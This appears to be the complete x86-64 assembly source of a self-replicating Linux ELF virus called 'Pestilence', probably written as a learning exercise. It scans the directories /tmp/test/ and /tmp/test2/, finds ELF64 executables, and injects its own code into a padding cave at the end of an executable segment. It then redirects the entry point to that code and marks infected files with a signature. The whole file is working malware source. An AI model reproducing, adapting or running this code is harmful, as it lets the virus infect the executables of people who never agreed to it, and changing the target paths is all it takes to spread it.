%include "pestilence.inc"

global _start
section .text

host:
			mov rax, SYSCALL_EXIT
			syscall

_start:
		; Save common registers
			push rdi
			push rsi
			push rcx
			push rdx

		; Allocate space in stack for pestilence struct
			enter s_pestilence_size, 0

		; Get host entry address and push it to stack
			lea rax, [rel _start]
			mov rdx, [rel payloadEntry]
			sub rax, rdx
			add rax, [rel hostEntry]
			push rax

			lea rdi, [rel infectDirectories]

	.openDir:
	; RDI => (char*) name of the directory to infect
		; Save dirname in R14 for later
			mov r14, rdi
		; Open directory
			mov rax, SYSCALL_OPEN
			mov rsi, O_RDONLY | O_DIRECTORY
			syscall
		; If fail, open next
			cmp rax, 0
			jl .nextDir
		; Save directory fd in pestilence struct
			mov VALUE(s_pestilence.dir_fd), rax

	.readDir:
		; Get directory entries
			mov rax, SYSCALL_GETDENTS
			mov rdi, VALUE(s_pestilence.dir_fd)
			lea rsi, VALUE(s_pestilence.dirents)
			mov rdx, DIRENT_ARR_SIZE
			syscall
		; 0 means no more entries, -1 means error
			cmp rax, 0
			jle .closeDir
		; Save entry array size in R12
			mov r12, rax

	.loopEntries:
		; R13 is offset in entry array, starts at 0
			xor r13, r13
		.isFile:
		; Get current entry
			lea rdi, VALUE(s_pestilence.dirents)
			add rdi, r13
		; Get entry type (last byte of entry)
			movzx edx, word [rdi + dirent.d_reclen]
			mov al, byte [rdi + rdx - 1]
		; Increment offset to next entry in array
			add r13, rdx
		; Check if entry is regular file
			cmp al, DT_REG
			jne .nextEntry
		; Entry is file, move filename to RDI and open file
			add rdi, dirent.d_name
			call processFile
		.nextEntry:
		; Compare current offset with array size
			cmp r13, r12
			jl .isFile
		; Reached end of array, get more entries
			jmp .readDir

	.closeDir:
			mov rax, SYSCALL_CLOSE
			mov rdi, VALUE(s_pestilence.dir_fd)
			syscall

	.nextDir:
		; Get next directory by looking after '\0'
			mov al, 0
			mov ecx, -1
			mov rdi, r14
			repnz scasb
			cmp byte [rdi], 0
			jnz .openDir

	.finish:
	; Restore stack and jump to host entry
			pop rax
            leave
            pop rdx
            pop rcx
            pop rsi
            pop rdi
        ; RAX is address of host program entry
            jmp rax


processFile:
	; R14 => directory name | RDI => file name
	.getFilePath:
		; Concatenate dirname and filename in pestilence struct
			push rdi
			mov rsi, r14
			lea rdi, VALUE(s_pestilence.file_path)
			cld
		.copyDirName:
			movsb
			cmp byte [rsi], 0
			jnz .copyDirName
			pop rsi
		.copyFileName:
			movsb
			cmp byte [rsi], 0
			jnz .copyFileName

	.openFile:
		; Open file and save fd in pestilence struct
			mov rax, SYSCALL_OPEN
			lea rdi, VALUE(s_pestilence.file_path)
			mov rsi, O_RDWR
			syscall
			cmp rax, 0
			jl .return
			mov VALUE(s_pestilence.file_fd), rax

	.getFileSize:
		; Call fstat() on file
			mov rax, SYSCALL_FSTAT
			mov rdi, VALUE(s_pestilence.file_fd)
			lea rsi, VALUE(s_pestilence.stat)
			syscall
			cmp rax, 0
			jnz .closeFile
		; Save file size in pestilence struct
			mov rsi, qword VALUE(s_pestilence.stat + stat.st_size)
			mov VALUE(s_pestilence.file_size), rsi

	.getFileMapping:
		; Call mmap() on file, mmap syscall has special argument registers
			mov rax, SYSCALL_MMAP
			xor rdi, rdi
			; RSI => file size
			mov rdx, PROT_READ | PROT_WRITE
			mov r10, MAP_SHARED
			mov r8, VALUE(s_pestilence.file_fd)
			xor r9, r9
			syscall
			cmp rax, MMAP_ERROR
			jae .closeFile
		; Save mapping in pestilence struct
			mov VALUE(s_pestilence.file_data), rax
			mov rdi, rax
		; Check if file is EL64
			call isElf64
			cmp rax, 0
		; ELF64 indeed, inject virus in file
			jz .unmap
			call injectVirus

	.unmap:
			mov rax, SYSCALL_MUNMAP
            mov rdi, VALUE(s_pestilence.file_data)
            mov rsi, VALUE(s_pestilence.file_size)
            syscall

    .closeFile:
	        mov rax, SYSCALL_CLOSE
	        mov rdi, VALUE(s_pestilence.file_fd)
	        syscall

    .return:
            ret


isElf64:
	; RDI => file mapping
			xor rax, rax

	.checkABI_VERSION:
			cmp qword [rdi + 8], 0
			jnz .return

	.checkSYSV_GNU:
			mov rdx, ELF_SYSV
			cmp qword [rdi], rdx
			jz .checkELF64_DYN_EXEC
			mov rdx, ELF_GNU
			cmp qword [rdi], rdx
			jnz .return

	.checkELF64_DYN_EXEC:
			mov rdx, ELF64_AND_DYN
			cmp qword [rdi + 16], rdx
			jz .setTrue
			mov rdx, ELF64_AND_EXEC
			cmp qword [rdi + 16], rdx
			jnz .return

	.setTrue:
			inc rax

	.return:
			ret


injectVirus:
	; RDI => file mapping
			push r13
			push r14

	.getELFHeadersInfo:
			mov r15, rdi
			mov rdx, qword [rdi + elf64_ehdr.e_entry]
			movzx rcx, word [rdi + elf64_ehdr.e_phnum]
			mov rax, qword [rdi + elf64_ehdr.e_phoff]
		; RDI is now address of program header
			add rdi, rax
			mov r14, rdi

	.findCodeCave:
		.checkCurrentSegment:
		; If e_phnum is 0, we checked all the segments
			cmp rcx, 0
			jle .return
		; Segment must be PT_LOAD with flags (PF_X | PF_R) on
			mov rax, SEGMENT_TYPE
			cmp rax, qword [rdi]
			jnz .nextSegment
		; Check if code cave is large enough
		; Get end of segment
			mov rax, qword [rdi + elf64_phdr.p_offset]
			add rax, qword [rdi + elf64_phdr.p_filesz]
			mov r13, rax
			lea rdi, [r15 + rax]
			mov rsi, rdi
		; Loop for PAYLOAD_SIZE as long as [rdi] is '\0'
			xor al, al
			mov rcx, PAYLOAD_SIZE
			repz scasb
			test rcx, rcx
			jz .checkAlreadyInfected

		.nextSegment:
			add rdi, elf64_phdr_size
			dec rcx
			jmp .checkCurrentSegment

	.checkAlreadyInfected:
		; RSI => segment end
		; Look a few byte before segment end to look for an already existing signature
			mov rax, [rel signature]
			cmp rax, qword [rsi - (_end - signature)]
			jz .return

	.injectPayload:
		; Copy PAYLOAD_SIZE bytes from _start to segment end
			lea rdi, [rel _start]
			xchg rdi, rsi
			mov rcx, PAYLOAD_SIZE
			repnz movsb

	.saveEntries:
		; RDI => segment end
		; Edit `payloadEntry` and `hostEntry` variables
			mov rax, qword [r15 + elf64_ehdr.e_entry]
			mov qword [rdi - 16], r13
			mov qword [rdi - 8], rax

	.updateFileHeader:
		; R13 => payload start
		; Edit file entry to payload start
			mov qword [r15 + elf64_ehdr.e_entry], r13
			mov rax, PAYLOAD_SIZE
		; Increase infected segment size to include payload
			add qword [r14 + elf64_phdr.p_filesz], rax
			add qword [r14 + elf64_phdr.p_memsz], rax

	.return:
			pop r14
			pop r13
			ret


data:
	infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
	signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
    payloadEntry: dq _start
    hostEntry: dq host
_end: